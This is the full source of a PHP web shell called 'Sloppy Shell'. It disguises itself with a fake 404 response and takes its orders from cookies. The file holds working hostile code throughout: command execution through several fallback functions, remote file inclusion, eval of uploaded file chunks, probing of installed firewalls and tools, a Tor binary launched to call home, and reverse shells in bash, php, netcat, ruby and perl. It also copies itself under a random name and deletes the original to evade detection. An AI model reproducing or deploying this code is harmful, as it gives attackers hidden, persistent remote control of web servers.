<?php
//LEAVE ME IN

error_reporting(E_WARNING | E_PARSE);
define("allow_agent", "");
define("uuid", "");
define("cname", "");
define("cval", "");
if (!defined('allowed_chars')) {
    define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
}

if (function_exists("sodium_crypto_aead_chacha20poly1305_decrypt") && function_exists("sodium_crypto_aead_chacha20poly1305_encrypt")) {
    if (!defined("slopEncryption")) {
        define("slopEncryption", true);
    } else {
        define("slopEncryption", false);
    }
}

if (!defined("os")) {
    define("slopos", strtoupper(substr(PHP_OS, 0, 3)));
}
$shell = (slopos === 'WIN') ? 'cmd.exe' : 'bash';

if (!defined('sloppyshell')) {
    define('sloppyshell', $shell);
}

if (!defined("dirSeparator")) {
    define("dirSeparator", slopos === 'WIN' ? '\\' : '/');
}

if (slopos === "Windows") {
    if (!is_dir(".\\scache")) {
        if (is_writable(getcwd())) {
            if (!is_dir(sprintf("%s\\scache", getcwd()))) {
                mkdir(".\\scache");
            }
            if (!strpos(shell_exec(sprintf("attrib %s\\scache", getcwd())), "H") === false) {
                shell_exec("attrib +H .\\scache");
            }
        } else {
            if (!is_dir(sprintf("%s\\scache", sys_get_temp_dir()))){
                mkdir(sprintf("%s\\scache", sys_get_temp_dir()));
            }
            if (!strpos(shell_exec(sprintf("attrib %s\\scache", sys_get_temp_dir())), "H") === false){
                shell_exec(sprintf("attrib +H %s\\scache", sys_get_temp_dir()));
            }
        }
        if (is_dir(sprintf("%s\\scache", getcwd()))){
            define("scache", sprintf("%s\\scache", getcwd()));
        }else{
            define("scache", sprintf("%s\\scache", sys_get_temp_dir()));
        }
    }
} else {
    if (!is_dir("./.scache")) {
        if (is_writable(getcwd())) {
            mkdir("./.scache");
            shell_exec(sprintf("chmod u=rwx,g=,o= %s/.scache", getcwd()));
        } else{
            mkdir(sprintf("%s/.scache", sys_get_temp_dir()));
            shell_exec(sprintf("chmod u=rwx,g=,o= %s/.scache", sys_get_temp_dir()));
        }
    }
    if (is_dir(sprintf("%s/.scache", sys_get_temp_dir()))){
        define("scache", sprintf("%s/.scache", sys_get_temp_dir()));
    }else{
        define("scache", sprintf("%s/.scache", getcwd()));
    }
}

if (function_exists("gnupg_decrypt") && function_exists("gnupg_key_import") && function_exists("escapeshellarg")) {
    if (!defined("slopPGP")) {
        define("slopPGP", true);
        putenv(sprintf("GNUPGHOME=%s/.gnupg", scache));
    } else {
        define("slopPGP", false);
    }
}

if (!is_file(sprintf("%s/.iCanCallYou", scache))) {
    if (!defined("slopTor")) {
        define("slopTor", false);
    } else {
        define("slopTor", true);
        if (!is_executable(sprintf("%s/%s", scache, 'iCanCallYou'))) {
            exec(sprintf("chmod +x %s/%s", scache, 'iCanCallYou'));
        }
        // this will run every time, and likely cause system lag. i will look at to make it a function that calls tor(which ive named something else, will likely make this a random name for the binary, and give it the ability to download the tor binary.
        // so that this shell can at least call home or communicate directly over tor.
        exec(sprintf("%s/%s&$(which disown)", scache, 'iCanCallYou'));
    }
}

// removing MTLS for now.

set_include_path(get_include_path() . PATH_SEPARATOR . scache);
ini_set("safe_mode", 0);
ini_set("file_uploads", "on");
ini_set("max_file_uploads", 20);
ini_set("upload_max_filesize", "40M");
ini_set("upload_tmp_dir", getcwd());
ini_set("post_max_size", "40M");
set_time_limit(400);
ini_set("memory_limit", "1000M");

function uwumodifyme()
{
    if (is_writable(getcwd() . "/")) {
        $me = file(getcwd() . "/" . $_SERVER['PHP_SELF']);
        if (str_contains($me[0], "<?php") === false) {
            $me[0] = "<?php" . PHP_EOL;
        }
        $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))) . PHP_EOL;
        $new_name = bin2hex(openssl_random_pseudo_bytes(10));
        file_put_contents(getcwd() . "/" . $new_name . ".php", $me);
        return [
            "Successful" => "HELLYEA",
            "NewName" => "{$new_name}.php",
            "Old" => $_SERVER['PHP_SELF']
        ];
    }
    return [
        "Successful" => "HELLNO",
        "NewName" => null,
        "Old" => null
    ];
}

function banner()
{
    echo str_repeat(PHP_EOL, 3);
    $logo = [
        "\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m",
        "\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m",
        "\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m",
        "\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m",
        "\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m",
        "\033[0;36mgr33tz: Notroot && Johnny5\nH4ppy h4ck1ng\033[0m\n\n\n"
    ];
    foreach ($logo as $line) {
        echo $line . PHP_EOL;
    }
}


// removing b64, replacing with chunked file transfer.
function chunkFileTransfer($fname, $data, $count, $chunk): string
{
    $da = "";
    $sum = md5($data);
    $d = base64_decode($data);
    if (slopos === "WIN"){
        $g = sprintf("%s\\%s\\%s.dat", sys_get_temp_dir(), bin2hex(openssl_random_pseudo_bytes(10)));
        if (!is_dir(sprintf("%s\\%s", sys_get_temp_dir(), $fname))){
            mkdir(sprintf("%s\\%s", sys_get_temp_dir(), $fname));
        }
        file_put_contents($g, $d);
    }else {
        $g = sprintf("%s/%s", $fname, bin2hex(openssl_random_pseudo_bytes(10)));
        file_put_contents(sprintf("%s/%s", $fname, bin2hex(openssl_random_pseudo_bytes(10))), $d);
    }
    if ($count === $chunk){
        foreach (glob(sprintf("%s/*", $g), GLOB_MARK) as $ff){
            if (!is_dir($ff)){
                $da += base64_decode(trim(file_get_contents($ff)));
                unlink($ff);
            }
        }
        unlink($g);
        return eval($da);
    }
    return $sum;
}

function checkComs(): array
{
    $useful_commands = [];
    $lincommands = array(
        "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
        'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
        'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid", "pg_lsclusters",
        "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool",
        "psql", "mysql", "sqlite3"
    );
    foreach ($lincommands as $item) {
        $useful_commands[$item] = shell_exec("which {$item} 2>/dev/null")
            ?? "Disabled";
    }
    return $useful_commands;
}

function parseProtections(): array
{
    $prots = [];
    $protections = array(
        "selinux", "iptables", "pfctl", "firewalld", "yast",
        "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd", "ufw"
    );
    foreach ($protections as $prot) {
        $prots[$prot] = shell_exec(" which {$prot} 2>/dev/null")
            ?? "Disabled";
    }
    return $prots;
}

function checkShells($os): array
{
    $usable_shells = [];
    $shells = [
        "Linux" => [
            "ksh", "csh", "zsh", "bash", "sh", "tcsh"
        ],
        "Windows" => [
            "cmd", "powershell", "pwsh"
        ]
    ];
    foreach ($shells[$os] as $shell) {
        $usable_shells[$shell] = shell_exec("which {$shell} 2>/dev/null")
            ?? "Disabled";
    }
    return $usable_shells;
}

function checkPack(): array
{
    $package_management = [];
    $packs = array(
        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3",
        "gem", "cargo", "nuget", "ant", "emerge", "go", "rustup", "shards", "nimble"
    );
    foreach ($packs as $pack) {
        $package_management[$pack] = shell_exec("which {$pack} 2>/dev/null")
            ?? "Disabled";
    }
    return $package_management;
}

// removed cloner.


function reverseConnections($methods, $host, $port, $shell)
{
    $defaultPort = 1634;
    $defaultHost = $_SERVER["REMOTE_ADDR"];
    $defaultShell = sloppyshell;

    if (empty($host)) {
        $useHost = $defaultHost;
    } else {
        $useHost = $host;
    }
    if (empty($shell)) {
        $useShell = $defaultShell;
    } else {
        $useShell = $shell;
    }
    if (empty($port)) {
        $usePort = $defaultPort;
    } else {
        $usePort = $port;
    }
    $comma = array(
        "bash" => sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", $useHost, (int)$usePort),
        "php" => sprintf("php -r '\$sock=fsockopen(\"%s\",%d);exec(\"%s -i <&3 >&3 2>&3\");'", $useHost, (int)$usePort, $useShell),
        "nc" => sprintf("nc -e %s \"%s\" %d\"", $useShell, $useHost, (int)$usePort),
        "ncS" => sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc \"%s\" %d >/tmp/f", $useHost, (int)$usePort),
        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"$useShell -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $useHost, (int)$usePort, $useShell),
    );
    if ($methods == "default") {
        $useMethod = $comma["bash"];
    } else {
        $useMethod = $methods;
    }
    if (!empty($useMethod)) {
        echo("\nAttempting to connect back, ensure you have the listener running.\n");
        echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
        system($comma[$methods]);
        return 1;
    } else {
        echo("\nYou didnt specify a method to use, defaulting to bash.\n");
        echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
        system($useMethod);
        return 1;
    }
}


function remoteFileInclude($targetFile)
{
    if (!empty($targetFile)) {
        include (base64_decode($targetFile)) or die("Could not remote import :(\n");
    }
}

function validate_auth($agent, $cookie_val, $uuid): bool
{
    if (is_null($agent) || is_null($cookie_val) || is_null($uuid)) {
        header(sprintf("Faliure: Auth did not work, all or one value was null - agent %s, cookie_val %s, uuid %s", is_null($agent), is_null($cookie_val), is_null($uuid)));
        header(sprintf("FailReason: agent - %s, cookie_val - %s, uuid - %s", sha1($agent), sha1($cookie_val), sha1($uuid)));
        return false;
    }
    if (hash_equals(allow_agent, sha1($agent)) && hash_equals(cval, sha1($cookie_val)) && hash_equals(uuid, sha1($uuid))) {
        header("Success: Auth worked!");
        return true;
    } else {
        header(sprintf("GeneralFailure: Auth failed. agent - %s, cookie_val - %s, uuid - %s, expecting: %s %s %s", $agent, $cookie_val, $uuid, $agent, cval, uuid));
        return false;
    }
}

function normalize_for_windows($com): string
{
    $com = base64_decode($com);
    if (str_contains($com, "/") !== false) {
        return str_replace($com, "/", "\\");
    }
    return $com;

}

function executeCommands($command)
{
    $output = "";
    if (defined("slopWindows")) {
        $command = normalize_for_windows($command);
    }
    # Try to find a way to run our command using various PHP internals
    if (function_exists('call_user_func_array')) {
        # http://php.net/manual/en/function.call-user-func-array.php
        ob_start();
        call_user_func_array('system', array($command));
        $output = ob_get_contents();
        ob_end_clean();
    } elseif (function_exists('call_user_func')) {
        # http://php.net/manual/en/function.call-user-func.php
        ob_start();
        call_user_func('system', $command);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (function_exists('passthru')) {
        # https://www.php.net/manual/en/function.passthru.php
        ob_start();
        passthru($command);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (function_exists('system')) {
        # this is the last resort. chances are PHP Suhosin
        # has system() on a blacklist anyways :>
        # http://php.net/manual/en/function.system.php
        ob_start();
        system($command);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (class_exists('ReflectionFunction')) {
        # http://php.net/manual/en/class.reflectionfunction.php
        $function = new ReflectionFunction('system');
        ob_start();
        $function->invoke($command);
        $output = ob_get_contents();
        ob_end_clean();

    }elseif(function_exists("exec")){
        $output = [];
        exec($command, $output);
    }else {
        return "No functions for code execution can be used.";
    }
    return match (true) {
        is_array($output) => implode(":", $output),
        default => implode(":", explode("\n", preg_replace("/\n(?=[^-|\h])/m", ";", $output))),   };
}

function slopp()
{
    if (validate_auth($_SERVER['HTTP_USER_AGENT'], $_COOKIE[cname], $_COOKIE['uuid'])) {
        header("I-Am-Alive: Yes");
        banner();
        switch (true) {
            case (isset($_COOKIE['cft'])):
                $putData = $_COOKIE['token'];
                $f = $_COOKIE['t'];
                $a = chunkFileTransfer($f, $putData);
                header(sprintf("MD5: %s", $a));
                break;
            case (isset($_COOKIE['qs'])):
                $qs = [];
                foreach (checkComs() as $commands => $isenabled) {
                    $isenabled = trim($isenabled);
                    if ($isenabled === "Disabled") {
                        $r = "\033[0;31m{$isenabled}\033[0m";
                    } else {
                        $r = "\033[0;36m{$isenabled}\033[0m";
                    }
                    $qs['commands'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
                }
                foreach (checkShells(slopos) as $shells => $isenabled) {
                    $isenabled = trim($isenabled);
                    if ($isenabled === "Disabled") {
                        $r = "\033[0;31m{$isenabled}\033[0m";
                    } else {
                        $r = "\033[0;36m{$isenabled}\033[0m";
                    }
                    $qs['shells'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
                }
                foreach (parseProtections() as $prots => $isenabled) {
                    $isenabled = trim($isenabled);
                    if ($isenabled === "Disabled") {
                        $r = "\033[0;31m{$isenabled}\033[0m";
                    } else {
                        $r = "\033[0;36m{$isenabled}\033[0m";
                    }
                    $qs['prots'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
                }
                foreach (checkPack() as $packs => $isenabled) {
                    $isenabled = trim($isenabled);
                    if ($isenabled === "Disabled") {
                        $r = "\033[0;31m{$isenabled}\033[0m";
                    } else {
                        $r = "\033[0;36m{$isenabled}\033[0m";
                    }
                    $qs['packManagers'] .= sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
                }
                $fsize = ini_get("max_file_uploads") ? "\033[0;32m" . ini_get("max_file_uploads") . "\033[0m" : "\033[0;31mcannot set max_file_uploads\033[0m";
                $sfem = ini_get("safe_mode") ? "\033[0;32mset to true\033[0m" : "\033[0;31mcannot set safemode.\033[0m";
                $fups = ini_get("file_uploads") ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m";
                $maxium_size = ini_get("upload_max_filesize") ? "\033[0;32m" . ini_get("upload_max_filesize") . "\033[0m" : "\033[0;31mcannot set fileupload size.\033[0m";
                $ftd = ini_get("upload_tmp_dir") ? "\033[0;32m" . ini_get("upload_tmp_dir") . "\033[0m" : "\033[0;31mcannot set upload_tmp_dir\033[0m";
                $incp = get_include_path();
                $slopDefines = implode(PHP_EOL, [
                    sprintf("slopEncryption: %s", slopEncryption ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
                    sprintf("slopOS: \033[0;32m%s\033[0m", slopos),
                    sprintf("slopShell: \033[0;32m%s\033[0m", sloppyshell),
                    sprintf("slopTor: %s", slopTor ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
                    sprintf("slopPGP: %s", slopPGP ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
                    sprintf(".scache full path: %s", scache)
                ]);
                $qs['configs'] = <<<INI
Max file uploads: $fsize
Safemode: $sfem
File_Uploads: $fups
Upload Temp Dir: $ftd
Maximum File upload size: $maxium_size
Include Path: $incp
---------------- SLOP DEFINES ---------------------
$slopDefines
INI. PHP_EOL;
                header(sprintf("D: %s", base64_encode(implode("\n", $qs))));
                break;
            case (isset($_COOKIE["cr"])):
                if ($_COOKIE['cr'] === "1") {
                    $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
                    header(sprintf("D: %s", base64_encode(executeCommands($split))));
                } elseif ($_COOKIE['cr'] === '1b') {
                    $split = base64_decode($_COOKIE['jsessionid']);
                    header(sprintf("D: %s", base64_encode(executeCommands($split))));
                } else {
                    $s = $_COOKIE['jsessionid'];
                    $v = explode(".", base64_decode($s));
                    if (defined("slopEncryption") && slopEncryption) {
                        try {
                            $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
                            header(sprintf("D: %s", base64_encode(executeCommands($split))));
                        } catch (SodiumException $e) {
                            header(sprintf("D: %s", $e->getMessage()));
                        }
                    } else {
                        header("D: Damnit jim, im a webshell, not a magician. I NEED SODIUM!");
                    }
                }
                break;
            case (isset($_COOKIE["doInclude"])):
                remoteFileInclude($_COOKIE["doInclude"]);
                break;
            case ($_SERVER['REQUEST_METHOD'] === "HEAD" && isset($_COOKIE['jsessionid'])):
                $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
                if (function_exists('pcntl_fork') === true) {
                    $pid = pcntl_fork();
                    if ($pid === -1) {
                        die("\n\n");
                    } else {
                        pcntl_wait($status);
                        reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
                    }
                } else {
                    $re = null;
                    passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
                }
                break;
            default:
                break;
        }
        foreach (uwumodifyme() as $new_data => $d) {
            header("{$new_data}: {$d}");
        }
        unlink($_SERVER['SCRIPT_FILENAME']);
        die();
    } else {
        die();
    }
}

try {
    header("Reason: File Not Found", false, 404);
    slopp();
} catch (Exception $e) {
    error_log($e, 3, sprintf("%s/ahhhhh.log", scache));
}
